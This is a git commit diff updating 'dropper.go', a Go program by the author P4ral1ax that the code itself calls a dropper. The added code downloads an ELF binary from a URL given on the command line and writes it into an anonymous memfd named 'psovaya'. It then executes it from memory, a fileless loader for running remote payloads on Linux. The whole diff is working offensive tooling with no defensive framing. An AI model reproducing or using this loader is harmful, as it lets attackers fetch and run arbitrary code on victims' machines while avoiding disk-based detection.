793f56254ef0b768b5057041d3d31ea9398fc1a9
P4ral1ax <braydenjw00@gmail.com>
2022-12-22 13:07:35 -0500

    Dropper Updates

--- dropper.go
+++ dropper.go
@@ -1,7 +1,12 @@
+/*
+Author - P4ral1ax
+*/
 package main
 
 import (
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"syscall"
 
@@ -16,16 +21,28 @@ func MemfdCreate(name string) int {
 		fmt.Printf("MemfdCreate Error: %v", err)
 		unix.Exit(0)
 	}
+	fmt.Printf("FD is %v", fd)
 	return fd
 }
 
 // Downloads ELF from URL
-func retrieveFile() {
-
+func retrieveFile(url string) (response []byte) {
+	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Printf("Error Retrieving File : %v", err)
+		unix.Exit(0)
+	}
+	defer resp.Body.Close()
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		print("Error Reading File : %v", err)
+		unix.Exit(0)
+	}
+	return body
 }
 
 // Write Content
-func WriteToMemfd(fd int, content string) {
+func WriteToMemfd(fd int, content []byte) {
 	fmt.Printf("Writing to MemFd Pointer")
 	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
 	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_WRONLY, 0644)
@@ -50,8 +67,22 @@ func ExecMemfd(fd int) {
 }
 
 func main() {
-	fd := MemfdCreate("psovaya")
-	fmt.Printf("FD is %v", fd)
-	//WriteToMemfd(fd, content)
+	// Define Usage string
+	usage := "Usage : ./dropper {url}"
+	var url string
+	var elfContent []byte
+	var fd int
 
+	// Read In URL & Get File
+	if len(os.Args[1:]) != 1 {
+		fmt.Printf("Incorrect number of arguements\n%v", usage)
+		unix.Exit(0)
+	}
+	url = os.Args[1]
+	elfContent = retrieveFile(url)
+
+	// Create fd and Inject Code
+	fd = MemfdCreate("psovaya")
+	WriteToMemfd(fd, elfContent)
+	ExecMemfd(fd)
 }
